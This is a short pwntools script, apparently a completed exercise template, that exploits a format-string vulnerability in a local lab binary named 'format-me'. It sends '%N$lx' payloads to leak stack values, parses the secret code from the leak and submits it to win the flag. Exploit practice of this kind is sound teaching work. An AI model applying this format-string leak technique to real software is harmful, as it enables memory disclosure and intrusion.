#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("./format-me")

r = process([exe.path])
# r = gdb.debug([exe.path]) # if you need to use gdb debug, please de-comment this line, and comment last line

for _ in range(10):
    # Add your code Here
    r.recvuntil(b"Recipient? ") # Think about what should be received first?
    r.sendline(b"AAAA.%6$lx.%7$lx.%8$lx.%9$lx.%10$lx.%11$lx.%12$lx.%13$lx") # Add your format string code here!
    r.recvuntil(b"Sending to ")
    leak = r.recvuntil(b"...\n", drop=True)
    # Add your code to receive leak val here , format: val = leak[idx_1:idx_2], please think about the idx
    chunks = leak.split(b".")
    code_hex = chunks[4]  # %9$lx is the fifth chunk
    val = str(int(code_hex, 16)).encode() # you need to fill in idx_1, and idx_2 by yourself
    
    r.recvuntil(b"Guess? ") #Think about what should be received?
    r.sendline(val) 
    r.recvuntil(b"Correct")

r.recvuntil(b"Here's your flag: ")
r.interactive()
